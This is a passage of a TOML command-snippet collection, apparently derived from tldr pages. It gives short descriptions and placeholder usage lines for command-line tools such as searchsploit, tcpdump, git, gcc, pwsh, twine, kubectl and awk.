  command = "searchsploit --www <search_terms>"
  output = ""

[[snippets]]
  description = "Copy ([m]irror) the resource to the current directory (requires the number of the exploit)"
  command = "searchsploit --mirror <exploit_number>"
  output = ""

[[snippets]]
  description = "E[x]amine the resource, using the pager defined in the `$PAGER` environment variable"
  command = "searchsploit --examine <exploit_number>"
  output = ""

[[snippets]]
  description = "[u]pdate the local Exploit Database"
  command = "searchsploit --update"
  output = ""

[[snippets]]
  description = "Search for the [c]ommon [v]ulnerabilities and [e]xposures (CVE) value"
  command = "searchsploit --cve <2021-44228>"
  output = ""

[[snippets]]
  description = "Check results in `nmap`'s XML output with service version (`nmap -sV -oX nmap-output.xml`) for known exploits"
  command = "searchsploit --nmap <path/to/nmap-output.xml>"
  output = ""

[[snippets]]
  description = "Show a summary of the latest commit on a branch"
  command = "git show-branch <branch_name|ref|commit>"
  output = ""

[[snippets]]
  description = "Compare commits in the history of multiple commits or branches"
  command = "git show-branch <branch_name1|ref1|commit1 branch_name2|ref2|commit2 ...>"
  output = ""

[[snippets]]
  description = "Compare all remote tracking branches"
  command = "git show-branch --remotes"
  output = ""

[[snippets]]
  description = "Compare both local and remote tracking branches"
  command = "git show-branch --all"
  output = ""

[[snippets]]
  description = "List the latest commits in all branches"
  command = "git show-branch --all --list"
  output = ""

[[snippets]]
  description = "Compare a given branch with the current branch"
  command = "git show-branch --current <commit|branch_name|ref>"
  output = ""

[[snippets]]
  description = "Display the commit name instead of the relative name"
  command = "git show-branch --sha1-name --current <current|branch_name|ref>"
  output = ""

[[snippets]]
  description = "Keep going a given number of commits past the common ancestor"
  command = "git show-branch --more <5> <commit|branch_name|ref> <commit|branch_name|ref> <...>"
  output = ""

[[snippets]]
  description = "Create a binary from a source file"
  command = "ocamlc <path/to/source_file.ml>"
  output = ""

[[snippets]]
  description = "Create a named binary from a source file"
  command = "ocamlc -o <path/to/binary> <path/to/source_file.ml>"
  output = ""

[[snippets]]
  description = "Automatically generate a module signature (interface) file"
  command = "ocamlc -i <path/to/source_file.ml>"
  output = ""

[[snippets]]
  description = "Compress a file with default options"
  command = "pigz <path/to/file>"
  output = ""

[[snippets]]
  description = "Compress a file using the best compression method"
  command = "pigz -9 <path/to/file>"
  output = ""

[[snippets]]
  description = "Compress a file using no compression and 4 processors"
  command = "pigz -0 -p<4> <path/to/file>"
  output = ""

[[snippets]]
  description = "Compress a directory using tar"
  command = "tar cf - <path/to/directory> | pigz > <path/to/file.tar.gz>"
  output = ""

[[snippets]]
  description = "Decompress a file"
  command = "pigz -d <archive.gz>"
  output = ""

[[snippets]]
  description = "List the contents of an archive"
  command = "pigz -l <archive.tar.gz>"
  output = ""

[[snippets]]
  description = "Start an interactive shell session"
  command = "pwsh"
  output = ""

[[snippets]]
  description = "Start an interactive shell session without loading startup configs"
  command = "pwsh -NoProfile"
  output = ""

[[snippets]]
  description = "Execute specific commands"
  command = "pwsh -Command ""<echo 'powershell is executed'>"""
  output = ""

[[snippets]]
  description = "Execute a specific script"
  command = "pwsh -File <path/to/script.ps1>"
  output = ""

[[snippets]]
  description = "Start a session with a specific version of PowerShell"
  command = "pwsh -Version <version>"
  output = ""

[[snippets]]
  description = "Prevent a shell from exit after running startup commands"
  command = "pwsh -NoExit"
  output = ""

[[snippets]]
  description = "Describe the format of data sent to PowerShell"
  command = "pwsh -InputFormat <Text|XML>"
  output = ""

[[snippets]]
  description = "Determine how an output from PowerShell is formatted"
  command = "pwsh -OutputFormat <Text|XML>"
  output = ""

[[snippets]]
  description = "Compile multiple source files into an executable"
  command = "gcc <path/to/source1.c path/to/source2.c ...> -o <path/to/output_executable>"
  output = ""

[[snippets]]
  description = "Show common warnings, debug symbols in output, and optimize without affecting debugging"
  command = "gcc <path/to/source.c> -Wall -g -Og -o <path/to/output_executable>"
  output = ""

[[snippets]]
  description = "Include libraries from a different path"
  command = "gcc <path/to/source.c> -o <path/to/output_executable> -I<path/to/header> -L<path/to/library> -l<library_name>"
  output = ""

[[snippets]]
  description = "Compile source code into Assembler instructions"
  command = "gcc -S <path/to/source.c>"
  output = ""

[[snippets]]
  description = "Compile source code into an object file without linking"
  command = "gcc -c <path/to/source.c>"
  output = ""

[[snippets]]
  description = "Optimize the compiled program for performance"
  command = "gcc <path/to/source.c> -O<1|2|3|fast> -o <path/to/output_executable>"
  output = ""

[[snippets]]
  description = "Update virus definitions"
  command = "freshclam"
  output = ""

[[snippets]]
  description = "List available network interfaces"
  command = "tcpdump -D"
  output = ""

[[snippets]]
  description = "Capture the traffic of a specific interface"
  command = "tcpdump -i <eth0>"
  output = ""

[[snippets]]
  description = "Capture all TCP traffic showing contents (ASCII) in console"
  command = "tcpdump -A tcp"
  output = ""

[[snippets]]
  description = "Capture the traffic from or to a host"
  command = "tcpdump host <www.example.com>"
  output = ""

[[snippets]]
  description = "Capture the traffic from a specific interface, source, destination and destination port"
  command = "tcpdump -i <eth0> src <192.168.1.1> and dst <192.168.1.2> and dst port <80>"
  output = ""

[[snippets]]
  description = "Capture the traffic of a network"
  command = "tcpdump net <192.168.1.0/24>"
  output = ""

[[snippets]]
  description = "Capture all traffic except traffic over port 22 and save to a dump file"
  command = "tcpdump -w <dumpfile.pcap> port not <22>"
  output = ""

[[snippets]]
  description = "Read from a given dump file"
  command = "tcpdump -r <dumpfile.pcap>"
  output = ""

[[snippets]]
  description = "Create a pull request for a project on GitHub"
  command = "git pull-request <target_branch>"
  output = ""

[[snippets]]
  description = "Display a cursor to kill a window when pressing the left mouse button (press any other mouse button to cancel)"
  command = "xkill"
  output = ""

[[snippets]]
  description = "Display a cursor to select a window to kill by pressing any mouse button"
  command = "xkill -button any"
  output = ""

[[snippets]]
  description = "Kill a window with a specific id (use `xwininfo` to get info about windows)"
  command = "xkill -id <id>"
  output = ""

[[snippets]]
  description = "Print the output of a command to the default printer (see `lpstat` command)"
  command = "echo ""test"" | lp"
  output = ""

[[snippets]]
  description = "Print a file to the default printer"
  command = "lp <path/to/filename>"
  output = ""

[[snippets]]
  description = "Print a file to a named printer (see `lpstat` command)"
  command = "lp -d <printer_name> <path/to/filename>"
  output = ""

[[snippets]]
  description = "Print N copies of file to default printer (replace N with desired number of copies)"
  command = "lp -n <N> <path/to/filename>"
  output = ""

[[snippets]]
  description = "Print only certain pages to the default printer (print pages 1, 3-5, and 16)"
  command = "lp -P 1,3-5,16 <path/to/filename>"
  output = ""

[[snippets]]
  description = "Resume printing a job"
  command = "lp -i <job_id> -H resume"
  output = ""

[[snippets]]
  description = "Copy your keys to the remote machine"
  command = "ssh-copy-id <username>@<remote_host>"
  output = ""

[[snippets]]
  description = "Copy the given public key to the remote"
  command = "ssh-copy-id -i <path/to/certificate> <username>@<remote_host>"
  output = ""

[[snippets]]
  description = "Copy the given public key to the remote with specific port"
  command = "ssh-copy-id -i <path/to/certificate> -p <port> <username>@<remote_host>"
  output = ""

[[snippets]]
  description = "Fix code even if it already has compiler errors"
  command = "cargo fix --broken-code"
  output = ""

[[snippets]]
  description = "Fix code even if the working directory has changes"
  command = "cargo fix --allow-dirty"
  output = ""

[[snippets]]
  description = "Migrate a package to the next Rust edition"
  command = "cargo fix --edition"
  output = ""

[[snippets]]
  description = "Fix the package’s library"
  command = "cargo fix --lib"
  output = ""

[[snippets]]
  description = "Fix the specified integration test"
  command = "cargo fix --test <name>"
  output = ""

[[snippets]]
  description = "Fix all members in the workspace"
  command = "cargo fix --workspace"
  output = ""

[[snippets]]
  description = "Convert an SBIG ST-4 file to a PGM file"
  command = "st4topgm <path/to/input_file.st4> > <path/to/output.pgm>"
  output = ""

[[snippets]]
  description = "Print Java stack traces for all threads in a Java process"
  command = "jstack <java_pid>"
  output = ""

[[snippets]]
  description = "Print mixed mode (Java/C++) stack traces for all threads in a Java process"
  command = "jstack -m <java_pid>"
  output = ""

[[snippets]]
  description = "Print stack traces from Java core dump"
  command = "jstack </usr/bin/java> <file.core>"
  output = ""

[[snippets]]
  description = "Start MonoDevelop"
  command = "monodevelop"
  output = ""

[[snippets]]
  description = "Open a specific file"
  command = "monodevelop <path/to/file>"
  output = ""

[[snippets]]
  description = "Open a specific file with the caret at a specific position"
  command = "monodevelop <path/to/file>;<line_number>;<column_number>"
  output = ""

[[snippets]]
  description = "Force opening a new window instead of switching to an existing one"
  command = "monodevelop --new-window"
  output = ""

[[snippets]]
  description = "Disable redirection of `stdout` and `stderr` to a log file"
  command = "monodevelop --no-redirect"
  output = ""

[[snippets]]
  description = "Enable performance monitoring"
  command = "monodevelop --perf-log"
  output = ""

[[snippets]]
  description = "Check the format of the specified reference name"
  command = "git check-ref-format <refs/head/refname>"
  output = ""

[[snippets]]
  description = "Print the name of the last branch checked out"
  command = "git check-ref-format --branch @{-1}"
  output = ""

[[snippets]]
  description = "Normalize a refname"
  command = "git check-ref-format --normalize <refs/head/refname>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr pamdepth"
  output = ""

[[snippets]]
  description = "Initialize a new GitHub CLI extension project in a directory of the same name"
  command = "gh extension create <extension_name>"
  output = ""

[[snippets]]
  description = "Install an extension from a GitHub repository"
  command = "gh extension install <owner>/<repository>"
  output = ""

[[snippets]]
  description = "List installed extensions"
  command = "gh extension list"
  output = ""

[[snippets]]
  description = "Upgrade a specific extension"
  command = "gh extension upgrade <extension_name>"
  output = ""

[[snippets]]
  description = "Upgrade all extensions"
  command = "gh extension upgrade --all"
  output = ""

[[snippets]]
  description = "List installed extensions"
  command = "gh extension list"
  output = ""

[[snippets]]
  description = "Remove an extension"
  command = "gh extension remove <extension_name>"
  output = ""

[[snippets]]
  description = "Display help about a subcommand"
  command = "gh extension <subcommand> --help"
  output = ""

[[snippets]]
  description = "Build the documentation for the current project and all dependencies"
  command = "cargo doc"
  output = ""

[[snippets]]
  description = "Do not build documentation for dependencies"
  command = "cargo doc --no-deps"
  output = ""

[[snippets]]
  description = "Build and open the documentation in a browser"
  command = "cargo doc --open"
  output = ""

[[snippets]]
  description = "Build and view the documentation of a particular package"
  command = "cargo doc --open --package <package>"
  output = ""

[[snippets]]
  description = "List dashboards for your account"
  command = "aws cloudwatch list-dashboards"
  output = ""

[[snippets]]
  description = "Display details for the specified dashboard"
  command = "aws cloudwatch get-dashboard --dashboard-name <dashboard_name>"
  output = ""

[[snippets]]
  description = "List metrics"
  command = "aws cloudwatch list-metrics"
  output = ""

[[snippets]]
  description = "List alarms"
  command = "aws cloudwatch describe-alarms"
  output = ""

[[snippets]]
  description = "Create or update an alarm and associate it with a metric"
  command = "aws cloudwatch put-metric-alarm --alarm-name <alarm_name> --evaluation-periods <evaluation_periods> --comparison-operator <comparison_operator>"
  output = ""

[[snippets]]
  description = "Delete the specified alarms"
  command = "aws cloudwatch delete-alarms --alarm_names <alarm_names>"
  output = ""

[[snippets]]
  description = "Delete the specified dashboards"
  command = "aws cloudwatch delete-dashboards --dashboard-names <dashboard_names>"
  output = ""

[[snippets]]
  description = "Run Ganache"
  command = "ganache-cli"
  output = ""

[[snippets]]
  description = "Run Ganache with a specific number of accounts"
  command = "ganache-cli --accounts=<number_of_accounts>"
  output = ""

[[snippets]]
  description = "Run Ganache and lock available accounts by default"
  command = "ganache-cli --secure"
  output = ""

[[snippets]]
  description = "Run Ganache server and unlock specific accounts"
  command = "ganache-cli --secure --unlock ""<account_private_key1>"" --unlock ""<account_private_key2>"""
  output = ""

[[snippets]]
  description = "Run Ganache with a specific account and balance"
  command = "ganache-cli --account=""<account_private_key>,<account_balance>"""
  output = ""

[[snippets]]
  description = "Run Ganache with accounts with a default balance"
  command = "ganache-cli --defaultBalanceEther=<default_balance>"
  output = ""

[[snippets]]
  description = "Run Ganache and log all requests to `stdout`"
  command = "ganache-cli --verbose"
  output = ""

[[snippets]]
  description = "Move a single file (open an editor with the source filename on the left and the target filename on the right)"
  command = "qmv <source_file>"
  output = ""

[[snippets]]
  description = "Move multiple JPG files"
  command = "qmv <*.jpg>"
  output = ""

[[snippets]]
  description = "Move multiple directories"
  command = "qmv -d <path/to/directory1> <path/to/directory2> <path/to/directory3>"
  output = ""

[[snippets]]
  description = "Move all files and directories inside a directory"
  command = "qmv --recursive <path/to/directory>"
  output = ""

[[snippets]]
  description = "Move files, but swap the positions of the source and the target filenames in the editor"
  command = "qmv --option swap <*.jpg>"
  output = ""

[[snippets]]
  description = "Rename all files and folders in the current directory, but show only target filenames in the editor (you can think of it as a kind of simple mode)"
  command = "qmv --format=do ."
  output = ""

[[snippets]]
  description = "Initialize a standard Pest configuration in the current directory"
  command = "pest --init"
  output = ""

[[snippets]]
  description = "Run tests in the current directory"
  command = "pest"
  output = ""

[[snippets]]
  description = "Run tests annotated with the given group"
  command = "pest --group <name>"
  output = ""

[[snippets]]
  description = "Run tests and print the coverage report to `stdout`"
  command = "pest --coverage"
  output = ""

[[snippets]]
  description = "Run tests with coverage and fail if the coverage is less than the minimum percentage"
  command = "pest --coverage --min=<80>"
  output = ""

[[snippets]]
  description = "Send mail (the content should be typed after the command, and ended with `Ctrl+D`)"
  command = "mailx -s ""<subject>"" <to_addr>"
  output = ""

[[snippets]]
  description = "Send mail with content passed from another command"
  command = "echo ""<content>"" | mailx -s ""<subject>"" <to_addr>"
  output = ""

[[snippets]]
  description = "Send mail with content read from a file"
  command = "mailx -s ""<subject>"" <to_addr> < <content.txt>"
  output = ""

[[snippets]]
  description = "Send mail to a recipient and CC to another address"
  command = "mailx -s ""<subject>"" -c <cc_addr> <to_addr>"
  output = ""

[[snippets]]
  description = "Send mail specifying the sender address"
  command = "mailx -s ""<subject>"" -r <from_addr> <to_addr>"
  output = ""

[[snippets]]
  description = "Send mail with an attachment"
  command = "mailx -a <path/to/file> -s ""<subject>"" <to_addr>"
  output = ""

[[snippets]]
  description = "Display the whole configuration of the specified interface"
  command = "ifdata -p <eth0>"
  output = ""

[[snippets]]
  description = "Indicate the [e]xistence of the specified interface via the exit code"
  command = "ifdata -e <eth0>"
  output = ""

[[snippets]]
  description = "Display the IPv4 [a]dress and the [n]etmask of the specified interface"
  command = "ifdata -pa -pn <eth0>"
  output = ""

[[snippets]]
  description = "Display the [N]etwork adress, the [b]roadcast adress, and the MTU of the specified interface"
  command = "ifdata -pN -pb -pm <eth0>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "ifdata"
  output = ""

[[snippets]]
  description = "Start a proxy and save all output to a file"
  command = "mitmdump -w <path/to/file>"
  output = ""

[[snippets]]
  description = "Filter a saved traffic file to just POST requests"
  command = "mitmdump -nr <input_filename> -w <output_filename> ""<~m post>"""
  output = ""

[[snippets]]
  description = "Replay a saved traffic file"
  command = "mitmdump -nc <path/to/file>"
  output = ""

[[snippets]]
  description = "Remove files or directories from the staging area"
  command = "hg remove <path/to/file>"
  output = ""

[[snippets]]
  description = "Remove all staged files matching a specified pattern"
  command = "hg remove --include <pattern>"
  output = ""

[[snippets]]
  description = "Remove all staged files, excluding those that match a specified pattern"
  command = "hg remove --exclude <pattern>"
  output = ""

[[snippets]]
  description = "Recursively remove sub-repositories"
  command = "hg remove --subrepos"
  output = ""

[[snippets]]
  description = "Remove files from the repository that have been physically removed"
  command = "hg remove --after"
  output = ""

[[snippets]]
  description = "Start `texlua` to act as a Lua interpreter"
  command = "lualatex"
  output = ""

[[snippets]]
  description = "Compile a Tex file to PDF"
  command = "lualatex <path/to/file.tex>"
  output = ""

[[snippets]]
  description = "Compile a Tex file without error interruption"
  command = "lualatex -interaction nonstopmode <path/to/file.tex>"
  output = ""

[[snippets]]
  description = "Compile a Tex file with a specific output file name"
  command = "lualatex -jobname=<filename> <path/to/file.tex>"
  output = ""

[[snippets]]
  description = "Connect to the main Ethereum network and automatically download the full node"
  command = "geth"
  output = ""

[[snippets]]
  description = "Connect to the Ropsten test network"
  command = "geth --testnet"
  output = ""

[[snippets]]
  description = "Create a new account"
  command = "geth account new"
  output = ""

[[snippets]]
  description = "Enable mining"
  command = "geth --mine"
  output = ""

[[snippets]]
  description = "Start Khal on interactive mode"
  command = "ikhal"
  output = ""

[[snippets]]
  description = "Print all events scheduled in personal calendar for the next seven days"
  command = "khal list -a <personal> <today> <7d>"
  output = ""

[[snippets]]
  description = "Print all events scheduled not in personal calendar for tomorrow at 10:00"
  command = "khal at -d <personal> <tomorrow> <10:00>"
  output = ""

[[snippets]]
  description = "Print a calendar with a list of events for the next three months"
  command = "khal calendar"
  output = ""

[[snippets]]
  description = "Add new event to personal calendar"
  command = "khal new -a <personal> <2020-09-08> <18:00> <18:30> ""<Dentist appointment>"""
  output = ""

[[snippets]]
  description = "Show details of pods in a [n]amespace"
  command = "kubectl describe pods --namespace <namespace>"
  output = ""

[[snippets]]
  description = "Show details of nodes in a [n]amespace"
  command = "kubectl describe nodes --namespace <namespace>"
  output = ""

[[snippets]]
  description = "Show the details of a specific pod in a [n]amespace"
  command = "kubectl describe pods <pod_name> --namespace <namespace>"
  output = ""

[[snippets]]
  description = "Show the details of a specific node in a [n]amespace"
  command = "kubectl describe nodes <node_name> --namespace <namespace>"
  output = ""

[[snippets]]
  description = "Show details of Kubernetes objects defined in a YAML manifest [f]ile"
  command = "kubectl describe --file <path/to/manifest.yaml>"
  output = ""

[[snippets]]
  description = "Pretty-print JSON or JSON-Lines data from `stdin` to `stdout`"
  command = "cat <file.json> | jello"
  output = ""

[[snippets]]
  description = "Output a schema of JSON or JSON Lines data from `stdin` to `stdout` (useful for grep)"
  command = "cat <file.json> | jello -s"
  output = ""

[[snippets]]
  description = "Output all elements from arrays (or all the values from objects) in JSON or JSON-Lines data from `stdin` to `stdout`"
  command = "cat <file.json> | jello -l"
  output = ""

[[snippets]]
  description = "Output the first element in JSON or JSON-Lines data from `stdin` to `stdout`"
  command = "cat <file.json> | jello _[0]"
  output = ""

[[snippets]]
  description = "Output the value of a given key of each element in JSON or JSON-Lines data from `stdin` to `stdout`"
  command = "cat <file.json> | jello '[i.<key_name> for i in _]'"
  output = ""

[[snippets]]
  description = "Output the value of multiple keys as a new JSON object (assuming the input JSON has the keys `key_name1` and `key_name2`)"
  command = "cat <file.json> | jello '{""<key1>"": _.<key_name1>, ""<key_name>"": _.<key_name2>}'"
  output = ""

[[snippets]]
  description = "Output the value of a given key to a string (and disable JSON output)"
  command = "cat <file.json> | jello -r '""<some text>: "" + _.<key_name>'"
  output = ""

[[snippets]]
  description = "List information about running virtual machines"
  command = "virsh list"
  output = ""

[[snippets]]
  description = "List information about virtual machines regardless of state"
  command = "virsh list --all"
  output = ""

[[snippets]]
  description = "List information about virtual machines with autostart either enabled or disabled"
  command = "virsh list --all --<autostart|no-autostart>"
  output = ""

[[snippets]]
  description = "List information about virtual machines either with or without snapshots"
  command = "virsh list --all --<with-snapshot|without-snapshot>"
  output = ""

[[snippets]]
  description = "Print the fifth column (a.k.a. field) in a space-separated file"
  command = "awk '{print $5}' <path/to/file>"
  output = ""

[[snippets]]
  description = "Print the second column of the lines containing "foo" in a space-separated file"
  command = "awk '/<foo>/ {print $2}' <path/to/file>"
  output = ""

[[snippets]]
  description = "Print the last column of each line in a file, using a comma (instead of space) as a field separator"
  command = "awk -F ',' '{print $NF}' <path/to/file>"
  output = ""

[[snippets]]
  description = "Sum the values in the first column of a file and print the total"
  command = "awk '{s+=$1} END {print s}' <path/to/file>"
  output = ""

[[snippets]]
  description = "Print every third line starting from the first line"
  command = "awk 'NR%3==1' <path/to/file>"
  output = ""

[[snippets]]
  description = "Print different values based on conditions"
  command = "awk '{if ($1 == ""foo"") print ""Exact match foo""; else if ($1 ~ ""bar"") print ""Partial match bar""; else print ""Baz""}' <path/to/file>"
  output = ""

[[snippets]]
  description = "Print all lines where the 10th column value equals the specified value"
  command = "awk '($10 == <value>)'"
  output = ""

[[snippets]]
  description = "Print all the lines which the 10th column value is between a min and a max"
  command = "awk '($10 >= <min_value> && $10 <= <max_value>)'"
  output = ""

[[snippets]]
  description = "Compile a sketch"
  command = "arduino-builder -compile <path/to/sketch.ino>"
  output = ""

[[snippets]]
  description = "Specify the debug level (default: 5)"
  command = "arduino-builder -debug-level <1..10>"
  output = ""

[[snippets]]
  description = "Specify a custom build directory"
  command = "arduino-builder -build-path <path/to/build_directory>"
  output = ""

[[snippets]]
  description = "Use a build option file, instead of specifying `--hardware`, `--tools`, etc. manually every time"
  command = "arduino-builder -build-options-file <path/to/build.options.json>"
  output = ""

[[snippets]]
  description = "Enable verbose mode"
  command = "arduino-builder -verbose <true>"
  output = ""

[[snippets]]
  description = "Create a new repository (if the repository name is not set, the default name will be the name of the current directory)"
  command = "glab repo create <name>"
  output = ""

[[snippets]]
  description = "Clone a repository"
  command = "glab repo clone <owner>/<repository>"
  output = ""

[[snippets]]
  description = "Fork and clone a repository"
  command = "glab repo fork <owner>/<repository> --clone"
  output = ""

[[snippets]]
  description = "View a repository in the default web browser"
  command = "glab repo view <owner>/<repository> --web"
  output = ""

[[snippets]]
  description = "Search some repositories in the GitLab instance"
  command = "glab repo search -s <search_string>"
  output = ""

[[snippets]]
  description = "List available devices"
  command = "liquidctl list"
  output = ""

[[snippets]]
  description = "Initialize all supported devices"
  command = "sudo liquidctl initialize all"
  output = ""

[[snippets]]
  description = "Print the status of available liquid coolers"
  command = "liquidctl status"
  output = ""

[[snippets]]
  description = "Match a string in product name to pick a device and set its fan speed to 0% at 20°C, 50% at 50°C and 100% at 70°C"
  command = "liquidctl --match <string> set fan speed <20 0 50 50 70 100>"
  output = ""

[[snippets]]
  description = "Apply the specified arithmetic function with `n` as the second argument to each sample in the specified PAM image"
  command = "pamfunc -<multiplier|divisor|adder|subtractor|min|max> <n> <path/to/input.pam> > <path/to/output.pam>"
  output = ""

[[snippets]]
  description = "Apply the specified bit string function with `n` as the second argument to each sample in the specified PAM image"
  command = "pamfunc -<andmask|ormask|xormask|shiftleft|shiftright> <n> <path/to/input.pam> > <path/to/output.pam>"
  output = ""

[[snippets]]
  description = "Inspect the changes to a container since it was created"
  command = "docker diff <container>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "docker diff --help"
  output = ""

[[snippets]]
  description = "Check the current package"
  command = "cargo check"
  output = ""

[[snippets]]
  description = "Check all tests"
  command = "cargo check --tests"
  output = ""

[[snippets]]
  description = "Check the integration tests in `tests/integration_test1.rs`"
  command = "cargo check --test <integration_test1>"
  output = ""

[[snippets]]
  description = "Check the current package with the features `feature1` and `feature2`"
  command = "cargo check --features <feature1,feature2>"
  output = ""

[[snippets]]
  description = "Check the current package with default features disabled"
  command = "cargo check --no-default-features"
  output = ""

[[snippets]]
  description = "Evaluate contents of a given file"
  command = "source <path/to/file>"
  output = ""

[[snippets]]
  description = "Evaluate contents of a given file (alternatively replacing `source` with `.`)"
  command = ". <path/to/file>"
  output = ""

[[snippets]]
  description = "View a CSV file"
  command = "csvlook <data.csv>"
  output = ""

[[snippets]]
  description = "Upload to PyPI"
  command = "twine upload dist/*"
  output = ""

[[snippets]]
  description = "Upload to the Test PyPI [r]epository to verify things look right"
  command = "twine upload -r testpypi dist/*"
  output = ""

[[snippets]]
  description = "Upload to PyPI with a specified [u]sername and [p]assword"
  command = "twine upload -u <username> -p <password> dist/*"
  output = ""

[[snippets]]
  description = "Upload to an alternative repository URL"
  command = "twine upload --repository-url <repository_url> dist/*"
  output = ""

[[snippets]]
  description = "Check that your distribution's long description should render correctly on PyPI"
  command = "twine check dist/*"
  output = ""

[[snippets]]
  description = "Upload using a specific pypirc configuration file"
  command = "twine upload --config-file <configuration_file> dist/*"
  output = ""

[[snippets]]
  description = "Continue uploading files if one already exists (only valid when uploading to PyPI)"
  command = "twine upload --skip-existing dist/*"
  output = ""

[[snippets]]
  description = "Upload to PyPI showing detailed information"
  command = "twine upload --verbose dist/*"
  output = ""

[[snippets]]
  description = "Display a list of available packages"
  command = "cradle package list"
  output = ""

[[snippets]]
  description = "Search for a package"
  command = "cradle package search <package>"
  output = ""

[[snippets]]
  description = "Install a package from Packagist"
  command = "cradle package install <package>"
  output = ""

[[snippets]]
  description = "Install a specific version of a package"
  command = "cradle package install <package> <version>"
  output = ""

[[snippets]]
  description = "Update a package"
  command = "cradle package update <package>"
  output = ""

[[snippets]]
  description = "Update a package to a specific version"
  command = "cradle package update <package> <version>"
  output = ""

[[snippets]]
  description = "Remove a specific package"
  command = "cradle package remove <package>"
  output = ""

[[snippets]]
  description = "List the contents of an archive"
  command = "pax -f <archive.tar>"
  output = ""

[[snippets]]
  description = "List the contents of a `gzip` archive"
  command = "pax -zf <archive.tar.gz>"
  output = ""

[[snippets]]
  description = "Create an archive from files"
  command = "pax -wf <target.tar> <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Create an archive from files, using output redirection"
  command = "pax -w <path/to/file1 path/to/file2 ...> > <target.tar>"
  output = ""

[[snippets]]
  description = "Extract an archive into the current directory"
  command = "pax -rf <source.tar>"
  output = ""

[[snippets]]
  description = "Copy to a directory, while keeping the original metadata; `target/` must exist"
  command = "pax -rw <path/to/file1> <path/to/directory1 path/to/directory2 ...> <target/>"
  output = ""

[[snippets]]
  description = "Start `htop`"
  command = "htop"
  output = ""

[[snippets]]
  description = "Start `htop` displaying processes owned by a specific user"
  command = "htop --user <username>"
  output = ""

[[snippets]]
  description = "Sort processes by a specified `sort_item` (use `htop --sort help` for available options)"
  command = "htop --sort <sort_item>"
  output = ""

[[snippets]]
  description = "Start `htop` with the specified delay between updates, in tenths of a second (i.e. 50 = 5 seconds)"
  command = "htop --delay <50>"
  output = ""

[[snippets]]
  description = "See interactive commands while running htop"
  command = "?"
  output = ""

[[snippets]]
  description = "Switch to a different tab"
  command = "tab"
  output = ""

[[snippets]]
  description = "Display help"
  command = "htop --help"
  output = ""

[[snippets]]
  description = "Print the completion script to `stdout`"
  command = "rustup completions <bash|elvish|fish|powershell|zsh> <rustup|cargo>"
  output = ""

[[snippets]]
  description = "Install and switch to the specified version of Neovim"
  command = "bob use <nightly|stable|latest|version_string|commit_hash>"
  output = ""

[[snippets]]
  description = "List installed and currently used versions of Neovim"
  command = "bob list"
  output = ""

[[snippets]]
  description = "Uninstall the specified version of Neovim"
  command = "bob uninstall <nightly|stable|latest|version_string|commit_hash>"
  output = ""

[[snippets]]
  description = "Uninstall Neovim and erase any changes `bob` has made"
  command = "bob erase"
  output = ""

[[snippets]]
  description = "Roll back to a previous nightly version"
  command = "bob rollback"
  output = ""

[[snippets]]
  description = "Run this when you use a project for the first time"
  command = "spatial worker build"
  output = ""

[[snippets]]
  description = "Build workers for local deployment on Unity on macOS"
  command = "spatial worker build --target=development --target=Osx"
  output = ""

[[snippets]]
  description = "Build workers for local deployment on Unreal on Windows"
  command = "spatial worker build --target=local --target=Windows"
  output = ""

[[snippets]]
  description = "Deploy locally"
  command = "spatial local launch <launch_config> --snapshot=<snapshot_file>"
  output = ""

[[snippets]]
  description = "Launch a local worker to connect to your local deployment"
  command = "spatial local worker launch <worker_type> <launch_config>"
  output = ""

[[snippets]]
  description = "Upload an assembly to use for cloud deployments"
  command = "spatial cloud upload <assembly_name>"
  output = ""

[[snippets]]
  description = "Launch a cloud deployment"
  command = "spatial cloud launch <assembly_name> <launch_config> <deployment_name>"
  output = ""

[[snippets]]
  description = "Clean worker directories"
  command = "spatial worker clean"
  output = ""

[[snippets]]
  description = "Start an HTTP server listening on the default port to serve the current directory"
  command = "serve"
  output = ""

[[snippets]]
  description = "Start an HTTP server on a specific [p]ort to serve a specific directory"
  command = "serve -p <port> <path/to/directory>"
  output = ""

[[snippets]]
  description = "Start an HTTP server with CORS enabled by including the `Access-Control-Allow-Origin: *` header in all responses"
  command = "serve --cors"
  output = ""

[[snippets]]
  description = "Start an HTTP server on the default port rewriting all not-found requests to the `index.html` file"
  command = "serve --single"
  output = ""

[[snippets]]
  description = "Start an HTTPS server on the default port using the specified certificate"
  command = "serve --ssl-cert <path/to/cert.pem> --ssl-key <path/to/key.pem>"
  output = ""

[[snippets]]
  description = "Start an HTTP server on the default port using a specific configuration file"
  command = "serve --config <path/to/serve.json>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "serve --help"
  output = ""

[[snippets]]
  description = "Merge a specific patch into CVS"
  command = "git cvsexportcommit -v -c -w <path/to/project_cvs_checkout> <commit_sha1>"
  output = ""

[[snippets]]
  description = "Run a specific test plan in nongui mode"
  command = "jmeter --nongui --testfile <path/to/file.jmx>"
  output = ""

[[snippets]]
  description = "Run a test plan in nongui mode using a specific log file"
  command = "jmeter --nogui --testfile <path/to/file.jmx> --logfile <path/to/logfile.jtl>"
  output = ""

[[snippets]]
  description = "Run a test plan in nongui mode using a specific proxy"
  command = "jmeter --nongui --testfile <path/to/file.jmx> --proxyHost <127.0.0.1> --proxyPort <8888>"
  output = ""

[[snippets]]
  description = "Run a test plan in nongui mode using a specific JMeter property"
  command = "jmeter --jmeterproperty <key>='<value>' --nongui --testfile <path/to/file.jmx>"
  output = ""

[[snippets]]
  description = "Start monitoring time in project"
  command = "watson start <project>"
  output = ""

[[snippets]]
  description = "Start monitoring time in project with tags"
  command = "watson start <project> +<tag>"
  output = ""

[[snippets]]
  description = "Stop monitoring time for the current project"
  command = "watson stop"
  output = ""

[[snippets]]
  description = "Display the latest working sessions"
  command = "watson log"
  output = ""

[[snippets]]
  description = "Edit most recent frame"
  command = "watson edit"
  output = ""

[[snippets]]
  description = "Remove most recent frame"
  command = "watson remove"
  output = ""

[[snippets]]
  description = "Start a HTTP server for the current directory"
  command = "updog"
  output = ""

[[snippets]]
  description = "Start a HTTP server for a specified directory"
  command = "updog --directory </path/to/directory>"
  output = ""

[[snippets]]
  description = "Start a HTTP server on a specified port"
  command = "updog --port <port>"
  output = ""

[[snippets]]
  description = "Start a HTTP server with a password (To log in, leave the username blank and enter the password in the password field)"
  command = "updog --password <password>"
  output = ""

[[snippets]]
  description = "Enable transport encryption via SSL"
